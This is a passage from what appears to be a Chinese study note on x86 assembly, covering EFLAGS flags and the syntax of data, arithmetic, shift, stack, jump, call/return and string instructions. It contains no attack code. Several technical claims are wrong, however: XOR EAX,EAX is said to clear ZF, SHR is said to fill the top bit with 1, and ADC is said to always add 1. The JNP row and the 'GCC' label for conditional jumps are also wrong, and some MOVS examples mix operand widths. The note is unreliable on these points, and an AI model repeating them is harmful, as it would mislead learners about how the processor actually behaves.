– 0xFFFFFFFF</td></tr><tr><td>ESI</td><td>字符串操作的源指针；SS段的数据指针</td><td>0 – 0xFFFFFFFF</td></tr><tr><td>EDI</td><td>字符串操作的目标指针；ES段的数据指针</td><td>0 – 0xFFFFFFFF</td></tr></tbody></table><h2 id="标志寄存器"><a class="markdownIt-Anchor" href="#标志寄存器"></a> 标志寄存器</h2><p>EFLAGS寄存器</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291119091.png" alt="202210032027304" /></p><h3 id="进位标志cfcarry-flag"><a class="markdownIt-Anchor" href="#进位标志cfcarry-flag"></a> 进位标志CF(Carry Flag)</h3><ul><li>如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0(无符号运算，AL中看超没超过FF  )<ul><li>最高位进位——CF=1<ul><li><code>MOV AL, 0xFE</code></li><li><code>ADD AL,2</code></li></ul></li><li>最高位不进位——CF=0<ul><li><code>MOV AL,0xEF</code></li><li><code>ADD AL,2</code></li></ul></li></ul></li></ul><h3 id="奇偶标志pfparity-flag"><a class="markdownIt-Anchor" href="#奇偶标志pfparity-flag"></a> 奇偶标志PF(Parity Flag)</h3><ul><li>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性，如果“1”的个数为偶数，则PF的值为1，否则其值为0——二进制中的1的个数</li><li>最低有效字节——**只看二进制中后8位 **<ul><li><code>MOV AL, 3</code>——PE不变</li><li><code>ADD AL, 3</code>——PE=1(6=110)</li><li><code>ADD AL, 2</code>——PE=0(8=1000)</li></ul></li></ul><h3 id="辅助进位标志afauxiliary-carry-flag"><a class="markdownIt-Anchor" href="#辅助进位标志afauxiliary-carry-flag"></a> 辅助进位标志AF(Auxiliary Carry Flag)</h3><ul><li>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<ul><li>(1)、在字操作时，发生低字节向高字节进位或借位时</li><li>(2)、在字节操作时，发生低4位向高4位进位或借位时</li></ul></li><li>例一：32位<ul><li><code>MOV EAX, 0x55EEFFFF</code></li><li><code>ADD EAX, 2</code></li></ul></li><li>例二：16位<ul><li><code>MOV AX, 5EFE</code></li><li><code>ADD AX, 2</code></li></ul></li><li>例三：8位<ul><li><code>MOV AL, 4E</code></li><li><code>ADD AL, 2</code></li></ul></li></ul><h3 id="零标志zfzero-flag"><a class="markdownIt-Anchor" href="#零标志zfzero-flag"></a> 零标志ZF(Zero Flag)</h3><ul><li>零标志ZF用来反映运算结果是否为0，如果运算结果(mov是赋值，不是运算结果)为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位<ul><li><code>XOR EAX, EAX</code>——ZF变成0</li><li><code>MOV EAX, 2</code>——ZF不变，与mov没有关系</li><li><code>SUB EAX, 2</code></li></ul></li></ul><h3 id="符号标志sfsign-flag"><a class="markdownIt-Anchor" href="#符号标志sfsign-flag"></a> 符号标志SF(Sign Flag)</h3><ul><li>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位(转换为2进制的最高位)相同<ul><li><code>MOV AL, 7F</code>——0111 1111</li><li><code>ADD AL, 2</code>—进位了</li></ul></li></ul><h3 id="溢出标志ofoverflow-flag"><a class="markdownIt-Anchor" href="#溢出标志ofoverflow-flag"></a> 溢出标志OF(Overflow Flag)</h3><ul><li>溢出标志OF用于反映有符号数加减运算所得结果是否溢出</li><li>如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0</li></ul><h4 id="溢出"><a class="markdownIt-Anchor" href="#溢出"></a> 溢出</h4><ul><li>进位标志<code>CF</code>表示无符号数运算结果是否超出范围</li><li>溢出标志<code>OF</code>表示有符号数运算结果是否超出范围</li><li>溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律：<ul><li>正 + 正 = 正 如果结果是负数，则说明有溢出</li><li>负 + 负 = 负 如果结果是正数，则说明有溢出</li><li>正 + 负 永远都不会有溢出</li><li><img src="https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4991/202210031849487.png" alt="" /></li></ul></li><li>例子<ul><li>1、无符号、有符号都不溢出<ul><li><code>MOV AL,8</code></li><li><code>ADD AL,8</code></li></ul></li><li>2、无符号溢出、有符号不溢出<ul><li><code>MOV AL,0FF</code></li><li><code>ADD AL,2</code></li></ul></li><li>3、无符号不溢出、有符号溢出<ul><li><code>MOV AL,7F</code></li><li><code>ADD AL,2</code></li></ul></li><li>4、无符号、有符号都溢出<ul><li><code>MOV AL,0FE</code></li><li><code>ADD AL,80</code></li></ul></li></ul></li></ul><h4 id="进位判断"><a class="markdownIt-Anchor" href="#进位判断"></a> 进位判断</h4><ul><li><p>比如80-40</p><ul><li><code>mov al,80</code></li><li><code>sub al,40</code></li></ul></li><li><p>相当于</p><ul><li><code>mov al, 80</code></li><li><code>add al,0c0</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291119729.png" alt="202210032041035" /></p><ul><li>符号有效位指最左边的那一位</li><li>最高有效数值位指符号位后一位</li></ul></li></ul><h1 id="汇编指令"><a class="markdownIt-Anchor" href="#汇编指令"></a> 汇编指令</h1><div class="note note-blue">            <p>r—表示通用寄存器<br />m—表示内存<br />imm—表示立即数</p>          </div><h2 id="数据传递指令"><a class="markdownIt-Anchor" href="#数据传递指令"></a> 数据传递指令</h2><h3 id="mov"><a class="markdownIt-Anchor" href="#mov"></a> <code>MOV</code></h3><ul><li>移动数据</li><li>MOV使用<ul><li><code>MOV 目标操作数 源操作数</code></li><li>作用：拷贝源操作数到目标操作数<ul><li>源操作数可以是立即数，通用寄存器，段寄存器，或者内存单元</li><li>目标操作数可以是通用寄存器，段寄存器或内存单元</li><li>操作数的宽度必须一样</li><li>源操作数和目标操作数不能同时为内存单元</li></ul></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Assembly">MOV r/m8, r8     <br>MOV r/m16, r16<br>MOV r/m32, r32<br><br>MOV r8, r/m8<br>MOV r16, r/m16<br>MOV r32, r/m32<br><br>MOV r8, imm8<br>MOV r16, imm16<br>MOV r32, imm32<br></code></pre></td></tr></table></figure><h3 id="xchg"><a class="markdownIt-Anchor" href="#xchg"></a> <code>XCHG</code></h3><ul><li>交换数据</li><li>格式：<code>XCHG  R/M,R/M</code>  两边不能同时为内存  宽度要一样</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">XCHG AL, CL<br>XCHG DWORD PTR DS:[12FFC4], EAX<br>XCHG BYTE PTR DS:[12FFC4], AL<br></code></pre></td></tr></table></figure><h2 id="逻辑运算指令"><a class="markdownIt-Anchor" href="#逻辑运算指令"></a> 逻辑运算指令</h2><h3 id="andorxor"><a class="markdownIt-Anchor" href="#andorxor"></a> <code>AND,OR,XOR</code></h3><ul><li>和,或,异或运算</li><li>对每一<strong>位</strong>进行比较</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;AND/OR/XOR用法相同<br>AND AL, imm8<br>AND AX, imm16<br>AND EAX, imm32<br><br>AND r/m8, imm8     <br>AND r/m16, imm16<br>AND r/m32, imm32<br>  <br>AND r/m16, imm8<br>AND r/m32, imm8<br><br>AND r/m8, r8     <br>AND r/m16, r16<br>AND r/m32, r32<br><br>AND r8, r/m8<br>AND r16, r/m16<br>AND r32, r/m32<br></code></pre></td></tr></table></figure><h3 id="not"><a class="markdownIt-Anchor" href="#not"></a> <code>NOT</code></h3><ul><li>非运算</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">NOT r/m8<br>NOT r/m16<br>NOT r/m32<br></code></pre></td></tr></table></figure><h2 id="算术运算指令"><a class="markdownIt-Anchor" href="#算术运算指令"></a> 算术运算指令</h2><h3 id="运算指令"><a class="markdownIt-Anchor" href="#运算指令"></a> 运算指令</h3><h4 id="add与sub"><a class="markdownIt-Anchor" href="#add与sub"></a> <code>ADD与SUB</code></h4><ul><li>加减运算</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Assembly">ADD/SUB AL, imm8<br>ADD/SUB AX, imm16<br>ADD/SUB EAX, imm32<br><br>ADD/SUB r/m8, imm8     <br>ADD/SUB r/m16, imm16<br>ADD/SUB r/m32, imm32<br>  <br>ADD/SUB r/m16, imm8<br>ADD/SUB r/m32, imm8<br><br>ADD/SUB r/m8, r8     <br>ADD/SUB r/m16, r16<br>ADD/SUB r/m32, r32<br><br>ADD/SUB r8, r/m8<br>ADD/SUB r16, r/m16<br>ADD/SUB r32, r/m32<br></code></pre></td></tr></table></figure><h4 id="adc"><a class="markdownIt-Anchor" href="#adc"></a> <code>ADC</code></h4><ul><li>带进位加法：加法之后再加1</li><li>格式：<code>ADC  R/M,R/M/IMM</code>两边不能同时为内存  宽度要一样</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADC AL,CL<br>ADC BYTE PTR DS:[12FFC4],2<br>ADC BYTE PTR DS:[12FFC4],AL<br></code></pre></td></tr></table></figure><h4 id="sbb"><a class="markdownIt-Anchor" href="#sbb"></a> <code>SBB</code></h4><ul><li>带借位减法：减法之后再减1</li><li>格式：<code>SBB  R/M,R/M/IMM</code>两边不能同时为内存  宽度要一样</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SBB AL, CL<br>SBB BYTE PTR DS:[12FFC4], 2<br>SBB BYTE PTR DS:[12FFC4], AL<br></code></pre></td></tr></table></figure><h4 id="inc与dec"><a class="markdownIt-Anchor" href="#inc与dec"></a> <code>INC与DEC</code></h4><ul><li><strong>INC</strong>加一指令，对于目的操作数进行加一操作</li><li><strong>DEC</strong>减一指令，对于目的操作数进行减一操作</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">INC REG/MEM<br>DEC REG/MEM<br></code></pre></td></tr></table></figure><h3 id="移位指令"><a class="markdownIt-Anchor" href="#移位指令"></a> 移位指令</h3><h4 id="算术移位指令"><a class="markdownIt-Anchor" href="#算术移位指令"></a> 算术移位指令</h4><ul><li><p>指令格式：SAL/SAR Reg/Mem, CL/Imm</p></li><li><p>SAL(Shift Arithmetic Left): 算术左移----末尾补0</p><p>SAR(Shift Arithmetic Right): 算术右移----考虑符号，最高位符号为1，则补1；反之补0</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SAL Reg/Mem, CL/Imm<br>SAR Reg/Mem, CL/Imm<br></code></pre></td></tr></table></figure><h4 id="逻辑移位指令"><a class="markdownIt-Anchor" href="#逻辑移位指令"></a> 逻辑移位指令</h4><ul><li><p>指令格式：SHL/SHR Reg/Mem, CL/Imm</p></li><li><p>SHL(Shift Left): 逻辑左移----末尾补0</p><p>SHR(Shift Right): 逻辑右移----最高位补1</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHL Reg/Mem, CL/Imm<br>SHR Reg/Mem, CL/Imm<br></code></pre></td></tr></table></figure><h4 id="循环移位指令"><a class="markdownIt-Anchor" href="#循环移位指令"></a> 循环移位指令</h4><ul><li><p>指令格式：ROL r/m, i8 ；ROR r/m, CL</p></li><li><p>ROL(Rotate Left): 循环左移</p><p>ROR(Rotate Right): 循环右移</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ROL r/m, i8<br>ROR r/m, CL<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291120603.png" alt="202301052011851" /></p><h4 id="带进位的循环移位指令"><a class="markdownIt-Anchor" href="#带进位的循环移位指令"></a> 带进位的循环移位指令</h4><ul><li><p>指令格式：RCL r/m, i8 ； RCR r/m, CL</p></li><li><p>RCL(Rotate through Carry Left): 带进位循环左移</p><p>RCR(Rotate through Carry Right): 带进位循环右移</p></li><li><p><code>将CF看成数据的一部分进行循环移位操作</code></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">RCL r/m, i8 <br>RCR r/m, CL<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291121306.png" alt="202301052016625" /></p><h2 id="堆栈操作指令"><a class="markdownIt-Anchor" href="#堆栈操作指令"></a> 堆栈操作指令</h2><ul><li><strong>堆栈的内存分配是由高地址向低地址延申的</strong></li></ul><h3 id="堆栈数据操作指令"><a class="markdownIt-Anchor" href="#堆栈数据操作指令"></a> 堆栈数据操作指令</h3><h4 id="push与pop"><a class="markdownIt-Anchor" href="#push与pop"></a> <code>PUSH与POP</code></h4><ul><li><strong>PUSH</strong>将数据入栈，ESP寄存器指向的地址减4，将数据存入栈中</li><li><strong>POP</strong>将数据出栈，ESP寄存器指向的地址会先将数据取出，ESP寄存器指向的地址加4</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH REG/MEM/IMM<br>POP  REG/MEM<br></code></pre></td></tr></table></figure><h3 id="保存恢复通用寄存器"><a class="markdownIt-Anchor" href="#保存恢复通用寄存器"></a> 保存/恢复通用寄存器</h3><h4 id="pushad与popad"><a class="markdownIt-Anchor" href="#pushad与popad"></a> <code>PUSHAD与POPAD</code></h4><ul><li><strong>PUSHAD</strong>指令再堆栈上按顺序压入所有的32位通用寄存器，顺序依次是EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI</li><li><strong>POPAD</strong>指令以相反的顺序从堆栈中弹出这些通用寄存器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSHAD<br>POPAD<br></code></pre></td></tr></table></figure><h3 id="保存恢复标志寄存器"><a class="markdownIt-Anchor" href="#保存恢复标志寄存器"></a> 保存/恢复标志寄存器</h3><h4 id="pushfd与popfd"><a class="markdownIt-Anchor" href="#pushfd与popfd"></a> <code>PUSHFD与POPFD</code></h4><ul><li><strong>PUSHFD</strong>压入32位的EFLAGS标志寄存器的值</li><li><strong>POPFD</strong>将堆栈顶部的值弹出并送至EFLAGS标志寄存器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSHFD<br>POPFD<br></code></pre></td></tr></table></figure><h2 id="转移指令"><a class="markdownIt-Anchor" href="#转移指令"></a> 转移指令</h2><h3 id="无条件转移指令"><a class="markdownIt-Anchor" href="#无条件转移指令"></a> 无条件转移指令</h3><h4 id="jmp"><a class="markdownIt-Anchor" href="#jmp"></a> <code>JMP</code></h4><ul><li>修改EIP的值，不影响寄存器和堆栈<ul><li><code>JMP 寄存器/立即数/内存</code>——相当于<code>MOV EIP， 寄存器/立即数/内存</code></li></ul></li><li>EIP决定CPU的指向，执行完一条语句后，其根据内存地址，再加上内存地址存储的数值大小，推测出下一条语句的内存地址编号，进而确定了要执行的语句</li></ul><h3 id="条件转移指令"><a class="markdownIt-Anchor" href="#条件转移指令"></a> 条件转移指令</h3><ul><li>条件转移指令又称为JCC指令集，根据EFLAGS标志寄存器中不同的标志位决定如何进行跳转</li></ul><h4 id="gcc"><a class="markdownIt-Anchor" href="#gcc"></a> <code>GCC</code></h4><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">指令</th><th style="text-align:center">含义</th><th style="text-align:center">测试条件</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><code>JE,JZ</code></td><td style="text-align:center">结果为零则跳转(相等时跳转)</td><td style="text-align:center">ZF=1才跳转，否则直接步进到下一条指令</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><code>JNE,JNZ</code></td><td style="text-align:center">结果不为零则跳转(不相等时跳转)</td><td style="text-align:center">ZF=0</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><code>JS</code></td><td style="text-align:center">结果为负则跳转</td><td style="text-align:center">SF=1</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><code>JNS</code></td><td style="text-align:center">结果为非负则跳转</td><td style="text-align:center">SF=0</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><code>JP,JPE</code></td><td style="text-align:center">结果中1的个数为偶数则跳转</td><td style="text-align:center">PF=1</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><code>JNP,JPE</code></td><td style="text-align:center">结果中1的个数为偶数则跳转</td><td style="text-align:center">PF=0</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><code>JO</code></td><td style="text-align:center">结果溢出了则跳转</td><td style="text-align:center">OF=1</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><code>JNO</code></td><td style="text-align:center">结果没有溢出则跳转</td><td style="text-align:center">OF=0</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><code>JB,JNAE</code></td><td style="text-align:center">小于则跳转 (无符号数)</td><td style="text-align:center">CF=1</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><code>JNB,JAE</code></td><td style="text-align:center">大于等于则跳转 (无符号数)</td><td style="text-align:center">CF=0</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><code>JBE,JNA</code></td><td style="text-align:center">小于等于则跳转 (无符号数)</td><td style="text-align:center">CF=1 or ZF=1</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><code>JNBE,JA</code></td><td style="text-align:center">大于则跳转(无符号数)</td><td style="text-align:center">CF=0 and ZF=0</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><code>JL,JNGE</code></td><td style="text-align:center">小于则跳转 (有符号数)</td><td style="text-align:center">SF≠OF</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><code>JNL,JGE</code></td><td style="text-align:center">大于等于则跳转 (有符号数)</td><td style="text-align:center">SF=OF</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><code>JLE,JNG</code></td><td style="text-align:center">小于等于则跳转 (有符号数)</td><td style="text-align:center">ZF=1 or SF≠ OF</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><code>JNLE,JG</code></td><td style="text-align:center">大于则跳转(有符号数)</td><td style="text-align:center">ZF=0 and SF=OF</td></tr></tbody></table><ul><li>经常和GCC指令搭配</li><li>补充:<ul><li><code>Z</code>–ZF，<code>S</code>–SF，<code>P</code>–PF，<code>O</code>–OF</li><li><code>E</code>----Equit(相等的)</li><li><code>L</code>----Low(低的)，<code>B</code>----Below(下面)</li><li><code>N</code>----Not(非)</li></ul></li></ul><h4 id="test"><a class="markdownIt-Anchor" href="#test"></a> <code>TEST</code></h4><ul><li><strong>TEST</strong>用于对两个操作数进行逻辑与运算，结果不送入目的操作数但影响标志位 OF、SF、ZF、PF 和 CF</li><li>通常用于测试一些条件是否满足。常见用法：用这个指令,可以确定某寄存器是否等于0<ul><li><code>TEST EAX,EAX</code>——观察Z位</li><li>如果EAX的二进制某些位为1的话,那么运算的结果就不为零</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Test reg, imm/reg/mem<br>Test mem, imm/reg<br></code></pre></td></tr></table></figure><h4 id="cmp"><a class="markdownIt-Anchor" href="#cmp"></a> <code>CMP</code></h4><ul><li><strong>CMP</strong>对两个操作数进行比较，比较的方式相当于用目的操作数减源操作数的减法操作，但是 cmp 只影响相应的标志寄存器，不会将减法的结果送入目的操作数中。影响的标志位有 OF、SF、ZF、AF、PF 和 CF</li><li>该指令是比较两个操作数,实际上,它相当于SUB指令,但是相减的结构并不保存到第一个操作数中，只是根据相减的结果 来改变零标志位(ZF)的,当两个操作数相等的时候,零标志位为1</li><li>例一：观察Z位<ul><li><code>MOV EAX, 100</code></li><li><code>MOV ECX, 100</code></li><li><code>CMP EAX,ECX</code>——Z位变成1</li></ul></li><li>例二：观察S位<ul><li><code>MOV EAX, 100</code></li><li><code>MOV ECX, 200</code></li><li><code>CMP EAX,ECX</code>——S位改变，则前一个数比后一个小</li></ul></li><li>例三：<ul><li><code>CMP AX,WORD PTR DS:[405000]</code></li><li><code>CMP AL,BYTE PTR DS:[405000]</code></li><li><code>CMP EAX,DWORD PTR DS:[405000]</code>——注意数据宽度</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Cmp reg, imm/reg/mem<br>Cmp mem, imm/reg<br></code></pre></td></tr></table></figure><h2 id="循环指令"><a class="markdownIt-Anchor" href="#循环指令"></a> 循环指令</h2><h3 id="loop"><a class="markdownIt-Anchor" href="#loop"></a> <code>LOOP</code></h3><ul><li><strong>LOOP</strong>是循环控制指令，需要使用 ecx 寄存器来进行循环计数，当执行到 loop 指令时，先将 ecx 寄存器中的值减 1，如果 ecx 寄存器中的值大于 0，则转移到 loop 指令后的地址处，如果 ecx 寄存器中的值等于 0，则执行 loop 指令的下一条指令</li><li>在使用汇编语言编写代码的时候，loop 后面跟随一个标号，而在反汇编代码中 loop 指令后跟随一个地址值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOOP s<br>LOOP 00403020<br></code></pre></td></tr></table></figure><h2 id="调用和返回指令"><a class="markdownIt-Anchor" href="#调用和返回指令"></a> 调用和返回指令</h2><h3 id="call"><a class="markdownIt-Anchor" href="#call"></a> <code>CALL</code></h3><ul><li><p><strong>CALL</strong>与JMP相似，但是在修改 EIP 寄存器的值之前，会将 call 指令的下一条指令的地址保存至堆栈，以便在调用过程(函数)后再继续从 call 指令处执行</p></li><li><p>按F7可以进行跳转，之后若是jmp指令，可以按回车进行跳转</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291121868.png" alt="202210032042660" /></p><ul><li>由<code>4183DC</code>得到<code>4183E1</code>是由<code>4183DC</code>加上此段的字节数<code>E8 26000000</code>共5个字节</li><li>之后ESP-4，ESP存储的是<code>004183E1</code>，EIP = <code>00418407</code></li></ul></li><li><p><code>CALL 地址A/寄存器</code>——相当于<code>MOV EIP,地址A/寄存器   Push 下一行地址</code></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call reg/mem/imm<br></code></pre></td></tr></table></figure><h3 id="ret"><a class="markdownIt-Anchor" href="#ret"></a> <code>RET</code></h3><ul><li><strong>RET</strong>用于过程(函数)的返回，该指令从堆栈的栈顶中弹出 4 个字节(这里的 4 个字节特指 32 位系统)送入 EIP 寄存器中。一般该指令在过程(函数)需要返回的位置或者是过程(函数)的结尾处</li><li>与CALL相结合，call 指令调用过程(函数)时会将 call 指令的下一条指令压入栈顶，当过程(函数)执<br />行中遇到 ret 指令时，会将 call 指令压入的指令弹出送入 EIP 寄存器中，这样代码的流程就会接着 call 指令的下一条指令继续执行</li><li>返回到call指令所处节点的下一个节点(上图中的<code>004183E1</code>)，即产生了回溯，同时退栈</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Ret<br>Retn imm<br></code></pre></td></tr></table></figure><h3 id="retn"><a class="markdownIt-Anchor" href="#retn"></a> <code>RETN</code></h3><ul><li>相当于<code>POP EIP</code></li><li>将<code>ESP</code>指向内存地址的值弹出到<code>EIP</code>指令指针寄存器中</li><li>同时ESP+4</li></ul><div class="note note-info">            <p>RET指令不需要修正堆栈栈顶的位置直接返回，RETN指令则需要修正堆栈栈顶的位置后再进行返回</p>          </div> <h2 id="串操作指令"><a class="markdownIt-Anchor" href="#串操作指令"></a> 串操作指令</h2><h3 id="串传送指令"><a class="markdownIt-Anchor" href="#串传送指令"></a> 串传送指令</h3><h4 id="movs"><a class="markdownIt-Anchor" href="#movs"></a> <code>MOVS</code></h4><ul><li><p><strong>MOVS</strong>是借助 ESI 寄存器和 EDI 寄存器，把内存中源地址(ESI指向源地址)的数据送入内存的目的地址(EDI指向目的地址)中，MOVS 指令有 MOVSB、MOVSW 和 MOVSD 三种宽度。</p></li><li><p>在执行了 MOVS 指令后，ESI 寄存器和 EDI 寄存器指向的地址会自动增加或减少 1 个单位(与数据宽度对应)。增加与减少依赖 EFLAGS 标志寄存器的 DF 标志位进行控制。DF = 0，增加；反之减少。</p></li><li><p><a href="https://blog.csdn.net/longintchar/article/details/50949923">movsb,movsw,movsd指令</a></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;BYTE/WORD/DWORD<br>  MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]  ;简写为：MOVSB<br>  MOVS WORD PTR ES:[EDI],BYTE PTR DS:[ESI]  ;简写为：MOVSW<br>  MOVS DWORD PTR ES:[EDI],BYTE PTR DS:[ESI] ;简写为：MOVSD<br>;例子<br> ;例一：<br>  MOV EDI,12FFD8<br>  MOV ESI,12FFD0<br>  MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]  ;观察EDI的值<br> ;例二：修改标志寄存器中D位的值，然后在执行下面的指令：<br>  MOV EDI,12FFD8<br>  MOV ESI,12FFD0<br>  MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]  ;观察EDI的值<br></code></pre></td></tr></table></figure><h3 id="串存储指令"><a class="markdownIt-Anchor" href="#串存储指令"></a> 串存储指令</h3><h4 id="stos"><a class="markdownIt-Anchor" href="#stos"></a> <code>STOS</code></h4><ul><li><strong>STOS</strong>是将 <code>AL/AX/EAX</code> 的值存储到 EDI 寄存器指向的内存单元。STOS 指令有 STOSB、STOSW 和 STOSD 三种宽度</li></ul><ol><li>[EDI]指向的内存单元——EDI存储的地址编号指向的地址内存</li><li>使用后EDI<code>+4/-4</code>，看EFLAGS寄存器<ol><li>DF = 0, EDI + 4</li><li>DF = 1, EDI - 4</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">STOS BYTE PTR ES:[EDI]  ;简写为STOSB，会自动补全<br>STOS WORD PTR ES:[EDI]  ;简写为STOSW<br>STOS DWORD PTR ES:[EDI] ;简写为STOSD<br>;例子：<br>  ;例一：<br>  MOV EAX,12345678<br>  MOV EDI,12FFC4<br>  STOS BYTE/WORD/DWORD PTR ES:[EDI]<br>  ;例二：修改标志寄存器中D位的值，然后再执行下面的指令：<br>  MOV EAX,12345678<br>  MOV EDI,12FFC4<br>  STOS BYTE/WORD/DWORD PTR ES:[EDI]<br></code></pre></td></tr></table></figure><h3 id="重复前缀指令"><a class="markdownIt-Anchor" href="#重复前缀指令"></a> 重复前缀指令</h3><h4 id="rep"><a class="markdownIt-Anchor" href="#rep"></a> <code>REP</code></h4><ul><li><p><strong>REP</strong>通过配合 ECX 寄存器即可实现重复执行的操作，当执行一次 REP 指令时，ECX寄存器的值都会自动减 1，如果 ECX 寄存器的值不为 0 则重复执行，如果 ECX 寄存器的值为 0 则重复执行结束</p></li><li><p>ECX后面的数字为十六进制，需转化为十进制，再重复执行</p></li><li><p><code>注意</code>：其余寄存器后面的数字也是十六进制</p></li></ul><figure class="highlight 